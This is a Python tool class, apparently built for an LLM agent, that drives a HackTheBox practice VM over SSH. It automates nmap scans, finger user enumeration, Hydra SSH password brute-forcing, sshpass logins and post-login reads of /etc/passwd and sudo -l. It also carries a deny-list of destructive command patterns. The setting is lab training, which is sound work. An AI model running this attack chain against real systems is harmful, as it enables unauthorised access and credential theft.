"""
title: SSH Command Executor
author: Ella Duffy
version: 1.2.8
description: Executes commands on my remote HTB Parrot OS VM with logging, retry logic, and enhanced wordlist metadata 
and improved secuirty features.

Security Features:
- Input Validation: Ensures host, username, target, port, command, wordlist, and directory inputs are safe using regex and existence checks.
- Command Whitelisting: Restricts execution to a predefined set of allowed commands (e.g., nmap, hydra) to prevent unauthorized actions.
- Command Sanitization: Uses shlex.quote to escape all command arguments, mitigating injection attacks.
- Dangerous Pattern Blocking: Detects and blocks commands with risky patterns (e.g., rm -rf, ; bash).
- Timeout Enforcement: Limits command execution time to prevent resource exhaustion.
- Enhanced Logging: Tracks security events (e.g., validation failures, command execution) for auditing.
"""

import paramiko
import os
import logging
import time
import re
import json
import ast
import shlex
from typing import Tuple, Optional, Dict, List
from langchain_community.chat_message_histories import ChatMessageHistory
from contextlib import contextmanager

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/ssh_executor.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

logger.info("Loading SSH Command Executor")

# Load configuration
with open("config.json", "r") as f:
    CONFIG = json.load(f)

class Tools:
    def __init__(self, memory: ChatMessageHistory = None):
        self.memory = memory if memory is not None else ChatMessageHistory()
        # SECURITY: Define allowed commands to prevent unauthorized execution
        self.allowed_commands = {
            "nmap", "finger-user-enum", "hydra", "sshpass", "whoami",
            "uname", "cat", "id", "sudo", "ls", "find"
        }
        # SECURITY: Block commands with dangerous patterns to mitigate risks
        self.dangerous_patterns = [
            r"rm\s+-rf", r"dd\s+if=", r"mkfs", r">\s*/dev/", r"\|.*bash",
            r";\s*bash", r"&.*bash", r"\$\(.*\)", r"`.*`"
        ]
    
    def validate_inputs(self, host: str, username: str, target: str = None, target_username: str = None, password: str = None, port: int = None, command: str = None, wordlist: str = None, directory: str = None):
        """Validate all inputs for tool methods."""
        logger.debug(f"Validating inputs: host={host}, username={username}, target={target}, target_username={target_username}, port={port}, command={command}, wordlist={wordlist}, directory={directory}")
        try:
            # SECURITY: Validate IPv4 addresses (0-255 range per octet) with regex
            ip_pattern = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
            if not re.match(ip_pattern, host):
                raise ValueError(f"Invalid host IP: {host}")
            if target and not re.match(ip_pattern, target):
                raise ValueError(f"Invalid target IP: {target}")
            # SECURITY: Validate usernames with safe pattern
            username_pattern = r"^[a-zA-Z0-9_-]+$"
            if not re.match(username_pattern, username):
                raise ValueError(f"Invalid username: {username}")
            if target_username and not re.match(username_pattern, target_username):
                raise ValueError(f"Invalid target_username: {target_username}")
            # SECURITY: Validate port range
            if port and (port < 1 or port > 65535): #Note: Ports 0 through 1023 are defined as well-known ports, registered ports are from 1024 to 49151 and the remainder of the ports from 49152 to 65535 can be used dynamically by applications.
                raise ValueError(f"Invalid port: {port}")
            # SECURITY: Validate command safety
            if command and not self.validate_command(command):
                raise ValueError(f"Unsafe command: {command}")
            if wordlist:
                check_command = f"ls {shlex.quote(wordlist)}"
                result = self.ssh_command_executor(host, username, check_command)
                if "No such file" in result:
                    raise ValueError(f"Wordlist not found: {wordlist}")
            # SECURITY: Prevent directory traversal
            if directory:
                if ".." in directory or "/" not in directory:
                    raise ValueError(f"Invalid directory: {directory}")
            logger.debug("All inputs validated successfully")
            return True
        except Exception as e:
            logger.error(f"Input validation failed: {str(e)}")
            raise

    def validate_command(self, command: str) -> bool:
        """Validate that the command is safe to execute."""
        # SECURITY: Check if command is in allowed list and lacks dangerous patterns
        command_start = command.split()[0] if command else ""
        if not any(command_start == cmd or command.startswith(f"{cmd} ") for cmd in self.allowed_commands):
            logger.error(f"Command '{command_start}' not in allowed list: {self.allowed_commands}")
            return False
        for pattern in self.dangerous_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                logger.error(f"Dangerous pattern detected in command: {pattern}")
                return False
        logger.debug(f"Command validation passed: {command}")
        return True

    @contextmanager
    def ssh_client(self, host: str, username: str, timeout: int = 300):
        """
        Context manager for SSH client connection with timeout and optional key.
        
        Args:
            host (str): The IP address of the VM to SSH into.
            username (str): The SSH username for the host VM.
            timeout (int): Maximum connection time in seconds (default: 300).
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, username=username, key_filename="/Users/elladuffy/.ssh/id_rsa", passphrase=os.environ.get("SSH_PASSPHRASE"), timeout=timeout)
            logger.info(f"SSH connection established to {host}")
            yield client
        except Exception as e:
            logger.error(f"SSH connection error: {str(e)}")
            raise
        finally:
            client.close()
            logger.info(f"SSH connection to {host} closed")

    def ssh_command_executor(self, host: str, username: str, command: str, timeout: int = 300) -> str:
        """
        Execute a command on my remote HTB Parrot OS VM using the SSH agent for authentication.
    
        Args:
            host (str): The IP address or hostname of the HTB VM (e.g., '10.0.0.215').
            username (str): The SSH username (e.g., 'user').
            command (str): The command to execute (e.g., 'whoami').
            timeout (int): Maximum execution time in seconds (default: 300).

        Returns:
            str: The output of the command (stdout + stderr).

        Raises:
            ValueError: If the SSH_PASSPHRASE environment variable not set.
        """
        if "nmap" in command.lower():
            timeout = max(timeout, CONFIG["nmap_timeout"])  # 6 minutes for Nmap
            logger.info(f"Set timeout to {timeout} seconds for Nmap command")
        elif "hydra" in command.lower():
            timeout = max(timeout, CONFIG["hydra_timeout"])  # 10 minutes for Hydra
            logger.info(f"Set timeout to {timeout} seconds for Hydra command")
        elif "finger-user-enum" in command.lower():
            timeout = max(timeout, CONFIG["finger_enum_timeout"])  # 10 minutes for finger-user-enum
            logger.info(f"Set timeout to {timeout} seconds for finger-user-enum command")

        logger.info(f"Connecting to {host} as {username}")
        passphrase = os.environ.get("SSH_PASSPHRASE")
        if not passphrase:
            logger.error("SSH_PASSPHRASE environment variable not set")
            raise ValueError("SSH_PASSPHRASE environment variable not set")
        
        try:
            start_time = time.time()
            with self.ssh_client(host, username, timeout) as client:   
                full_command = f"PATH=$PATH:/sbin:/usr/sbin {command}"
                logger.info(f"Executing command: {full_command}")
                channel = client.get_transport().open_session()
                channel.settimeout(timeout)
                channel.exec_command(full_command)
                output = []
                stderr_output = []
                
                while time.time() - start_time < timeout:
                    if channel.exit_status_ready():
                        # Command has finished
                        while channel.recv_ready():
                            output.append(channel.recv(4096).decode())
                        while channel.recv_stderr_ready():
                            stderr_output.append(channel.recv_stderr(4096).decode())
                        break
                    if channel.recv_ready():
                        data = channel.recv(4096).decode()
                        output.append(data)
                        logger.debug(f"Received stdout chunk: {data[:100]}...")
                    if channel.recv_stderr_ready():
                        error = channel.recv_stderr(4096).decode()
                        stderr_output.append(error)
                        logger.debug(f"Received stderr chunk: {error[:100]}...")
                    time.sleep(0.5)  # Increased polling interval to reduce CPU usage

                # Ensure all remaining output is captured
                while channel.recv_ready():
                    output.append(channel.recv(4096).decode())
                while channel.recv_stderr_ready():
                    stderr_output.append(channel.recv_stderr(4096).decode())

                # Get exit status
                exit_status = channel.recv_exit_status() if channel.exit_status_ready() else -1
                logger.info(f"Command exit status: {exit_status}")

                result = "".join(output).strip()
                error_result = "".join(stderr_output).strip()
                if error_result:
                    logger.warning(f"Command stderr: {error_result}")
                    result += "\n" + error_result

                logger.info(f"Command output:\n{result}")
                return result

        except paramiko.SSHException as e:
            logger.error(f"SSH execution failed: {str(e)}")
            raise
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            raise

    def scan_ports(self, host: str, username: str, target: str, port_range: str = "1-1000,22022") -> Dict[str, str]:
        """
        Scan open ports on the remote host using nmap via SSH.

        Args:
            host (str): The IP address of the VM to SSH into (e.g., '10.0.0.215').
            username (str): The SSH username.
            target (str): The target IP to scan (e.g., '10.10.10.76').
            port_range (str): The port range to scan with nmap.

        Returns:
            dict: Dictionary of port:service pairs.
        """
        logger.info(f"Scanning open ports on {target} in the range {port_range}")
        command = f"nmap -p{shlex.quote(port_range)} {shlex.quote(target)} --max-retries 2 -Pn --open"
        self.validate_inputs(host, username, target=target, command=command)
        try:
            output = self.ssh_command_executor(host, username, command)
            ports = {}
            for line in output.splitlines():
                match = re.search(r"(\d+)/tcp\s+open\s+(\w+)", line)
                if match:
                    port, service = match.groups()
                    ports[port] = service
            logger.info(f"Scanned ports: {ports}")
            self.memory.add_message({"role": "assistant", "content": f"Scanned ports on {target}: {ports}"})
            return ports
        except Exception as e:
            logger.error(f"Port scan failed: {str(e)}")
            self.memory.add_message({"role": "assistant", "content": f"Port scan failed on {target}: {str(e)}"})
            return {}

    def enumerate_users(self, host: str, username: str, target: str, wordlist: str = None) -> List[str]:
        """
        Enumerate users on the remote host using finger via SSH.

        Args:
            host (str): The IP address of the VM to SSH into.
            username (str): The SSH username.
            target (str): The target IP.
            wordlist (str): Path to username wordlist on target.

        Returns:
            list: List of enumerated users.
        """
        logger.info(f"Enumerating users on {target} with wordlist {wordlist}")
        wordlist = wordlist or CONFIG["wordlists"]["usernames"][0]["path"]
        command = f"finger-user-enum -U {shlex.quote(wordlist)} -t {shlex.quote(target)}"
        self.validate_inputs(host, username, target=target, wordlist=wordlist, command=command)
        try:
            output = self.ssh_command_executor(host, username, command)
            users = set()
            system_users = {"access", "admin", "bin", "ikeuser", "lp", "smmsp", "sys", "daemon", "nobody", "root", "adm", "dladm", "netadm", "netcfg", "dhcpserv"}
            for line in output.splitlines():
                if "@" in line and ":" in line and "ssh" in line.lower():
                    user_part = line.split(":")[1].strip()
                    if user_part:
                        parts = user_part.split()
                        if parts and not parts[0].startswith("<"):
                            user = parts[0].lower()
                            if (user.isalpha() and 
                                user not in system_users and 
                                user not in ["login", "name", "tty"]):
                                users.add(user)
            users_list = sorted(list(users))
            if not users_list:
                logger.info(f"No users enumerated on {target}")
                self.memory.add_message({"role": "assistant", "content": f"No users enumerated on {target}"})
            else:
                logger.info(f"Refined SSH users: {users_list}")
                self.memory.add_message({"role": "assistant", "content": f"Enumerated users on {target}: {users_list}"})
            return users_list
        except Exception as e:
            logger.error(f"User enumeration failed: {str(e)}")
            self.memory.add_message({"role": "assistant", "content": f"User enumeration failed on {target}: {str(e)}"})
            return []

    def detect_ssh_port(self, host: str, username: str, target: str) -> Optional[int]:
        """
        Detect the port running SSH on the target host using nmap, so we can adequately brute force the service. 
        
        Args:
            host (str): The IP address of the VM to SSH into.
            username (str): The SSH username.
            target (str): The target IP.
        
        Returns:
            int: Port number where SSH is detected, or None if not found
        """
        self.validate_inputs(host, username, target=target)
        logger.info(f"Detecting SSH port on {target}")
        try:
            memory_content = "\n".join(msg["content"] for msg in self.memory.messages if "content" in msg)
            logger.info(f"Checking memory... \n: {memory_content}")
            match = re.search(r"SSH detected on port: (\d+)", memory_content)
            if match:
                port = int(match.group(1))
                logger.info(f"SSH port {port} retrieved from LLM memory.")
                self.memory.add_message({"role": "assistant", "content": f"SSH detected on port: {port} (from memory)"})
                return port
            
            scan_match = re.search(r"Scanned ports on " + re.escape(target) + r":\s*({[^}]*})", memory_content)
            if scan_match:
                ports_str = scan_match.group(1).strip()
                try:
                    ports = ast.literal_eval(ports_str)
                    for port, service in ports.items():
                        if service.lower() in ["ssh", "openssh"]:
                            logger.info(f"SSH port {port} found in scan_ports memory with service {service}.")
                            self.memory.add_message({"role": "assistant", "content": f"SSH detected on port: {port}"})
                            return int(port)
                        elif service.lower() == "unknown":
                            logger.info(f"Probing unknown service on memory port {port} for SSH.")
                            probe_cmd = f"nmap -p {shlex.quote(port)} -sC -sV {shlex.quote(target)}"
                            self.validate_inputs(host, username, target=target, command=probe_cmd)
                            output = self.ssh_command_executor(host, username, probe_cmd)
                            if "ssh" in output.lower():
                                detected_port = int(port)
                                logger.info(f"SSH confirmed on probed port: {detected_port}")
                                self.memory.add_message({"role": "assistant", "content": f"SSH detected on port: {detected_port}"})
                                return detected_port
                except (ValueError, SyntaxError) as e:
                    logger.error(f"Failed to parse ports string '{ports_str}': {str(e)}")
            
            logger.info("No memory data, running fast nmap scan.")
            fast_scan_cmd = f"nmap -p 22,22022,2222,22222 -sC -sV {shlex.quote(target)}"
            self.validate_inputs(host, username, target=target, command=fast_scan_cmd)
            output = self.ssh_command_executor(host, username, fast_scan_cmd)
            ssh_port = None
            for line in output.splitlines():
                match = re.search(r"(\d+)/tcp\s+open\s+ssh", line)
                if match:
                    ssh_port = int(match.group(1))
                    logger.info(f"SSH detected on port: {ssh_port}")
                    break
            if ssh_port:
                self.memory.add_message({"role": "assistant", "content": f"SSH detected on port: {ssh_port}"})
                return ssh_port
            else:
                self.memory.add_message({"role": "assistant", "content": "No SSH port detected."})
                logger.warning("No SSH port detected.")
                return None
        except Exception as e:
            logger.error(f"Error detecting SSH port: {str(e)}")
            self.memory.add_message({"role": "assistant", "content": f"Error detecting SSH port on {target}: {str(e)}"})
            return None

    def run_hydra_attack(self, host: str, username: str, target: str, target_username: str, password_file: str, port: int = 22, protocol: str = "ssh") -> Dict[str, str]:
        """
        Run a Hydra password attack on the target using the specified username and password list.
        
        Args:
            host (str): The IP address of the VM to SSH into (e.g., '10.0.0.215').
            username (str): The SSH username for the host VM (e.g., 'user').
            target (str): The target IP address to attack (e.g., '10.10.10.76').
            target_username (str): The username to test on the target (e.g., 'sunny').
            password_file (str): Path to the password list (e.g., '/usr/share/seclists/Passwords/probable-v2-top1575.txt').
            port (int): The port to target (e.g., 22022).
            protocol (str): The protocol to use (e.g., 'ssh', default is 'ssh').

        Returns:
            dict: Dictionary of username:password pairs that succeed.
        """
        if not target_username:
            logger.warning(f"No target username provided for Hydra attack on {target}")
            self.memory.add_message({"role": "assistant", "content": f"No target username provided for Hydra attack on {target}"})
            return {}
        logger.info(f"Starting Hydra attack on {target} for {target_username} with port {port}")

        # Run Hydra
        port_str = str(port)
        command = f"hydra -l {shlex.quote(target_username)} -P {shlex.quote(password_file)} -I {shlex.quote(protocol)}://{shlex.quote(target)} -s {shlex.quote(port_str)}"
        self.validate_inputs(host, username, target=target, target_username=target_username, wordlist=password_file, port=port, command=command)
        try:
            output = self.ssh_command_executor(host, username, command, timeout=CONFIG["hydra_timeout"])
            credentials = {}
            for line in output.splitlines():
                if "[ssh]" in line and "login:" in line and "password:" in line:
                    login_index = line.index("login:") + len("login:")
                    password_index = line.index("password:")
                    cred_user = line[login_index:password_index].strip()
                    cred_pass = line[password_index + len("password:"):].strip()
                    if cred_user and cred_pass:
                        credentials[cred_user] = cred_pass
                        logger.info(f"Found credentials: {credentials}")
                        break
            if credentials:
                self.memory.add_message({"role": "assistant", "content": f"Hydra success: {credentials} on {target}"})
                return credentials
            else:
                logger.warning(f"No credentials found in Hydra output")
                self.memory.add_message({"role": "assistant", "content": f"No successful logins on {target}"})
                return {}
        except Exception as e:
            logger.error(f"Hydra attack failed: {str(e)}")
            self.memory.add_message({"role": "assistant", "content": f"Hydra failed on {target}: {str(e)}"})
            return {}

    def ssh_login(self, host: str, username: str, target: str, target_username: str, password: str, port: int = 22) -> Dict[str, str]:
        """
        Attempt SSH login to a target with username, password, and port.
        
        Args:
            host (str): The IP address of the VM to SSH into (e.g., '10.0.0.215').
            username (str): The SSH username for the host VM (e.g., 'user').
            target (str): The target IP address to attack (e.g., '10.10.10.76').
            target_username (str): The username to test logging into on the target (e.g., 'sunny').
            password(str): Password to use for SSH login (e.g., 'password1').
            port (int): The SSH port to target (default: 22).

        Returns:
            dict: A dictionary containing:
                - "status": "success" if login succeeds, "failed" if it fails.
                - "output": Output of command if successful (e.g., 'sammy').
                - "error": Error message if login fails (e.g., 'Authentication failed').
        """
        logger.info(f"Attempting SSH login to {target} as {target_username} on port {port}")
        command = f"sshpass -p {shlex.quote(password)} ssh -o StrictHostKeyChecking=no -p {shlex.quote(str(port))} {shlex.quote(target_username)}@{shlex.quote(target)} whoami"
        self.validate_inputs(host, username, target=target, target_username=target_username, password=password, port=port, command=command)
        try:
            output = self.ssh_command_executor(host, username, command, timeout=300)
            result = {"status": "success", "output": output}
            logger.info(f"SSH login successful: {result}")
            self.memory.add_message({"role": "assistant", "content": f"SSH login to {target} as {target_username} succeeded: {output}"})
            return result
        except Exception as e:
            logger.error(f"SSH login failed: {str(e)}")
            self.memory.add_message({"role": "assistant", "content": f"SSH login to {target} as {target_username} failed: {str(e)}"})
            return {"status": "failed", "error": str(e)}

    def enumerate_system(self, host: str, username: str, target: str, target_username: str, password: str, port: int = 22) -> Dict[str, str]:
        """
        Gather system information (e.g., uname, /etc/passwd, id) on the target after SSH login.port
        
        Args:
            host (str): The IP address of the VM to SSH into (e.g., '10.0.0.215').
            username (str): The SSH username for the host VM (e.g., 'user').
            target (str): The target IP address to attack (e.g., '10.10.10.76').
            target_username (str): The username to test logging into on the target (e.g., 'sunny').
            password(str): Password to use for SSH login (e.g., 'password1').
            port (int): The SSH port to target (default: 22).

        Returns:
            dict: Dictionary of commands and their corresponding outputs, wether that is success or an error
    
        """
        logger.info(f"Enumerating system info on {target} as {target_username}")
        commands = ["uname -a", "cat /etc/passwd", "id", "sudo -l"]
        results = {}
        for cmd in commands:
            command = f"sshpass -p {shlex.quote(password)} ssh -o StrictHostKeyChecking=no -p {shlex.quote(str(port))} {shlex.quote(target_username)}@{shlex.quote(target)} {shlex.quote(cmd)}"
            self.validate_inputs(host, username, target=target, target_username=target_username, password=password, port=port, command=command)
            try:
                output = self.ssh_command_executor(host, username, command)
                results[cmd] = output
            except Exception as e:
                results[cmd] = f"Error: {str(e)}"
        self.memory.add_message({"role": "assistant", "content": f"System enumeration on {target}: {results}"})
        return results

    def list_wordlists(self, category: str) -> List[Dict]:
        logger.info(f"Listing {category} wordlists")
        return CONFIG["wordlists"].get(category, [])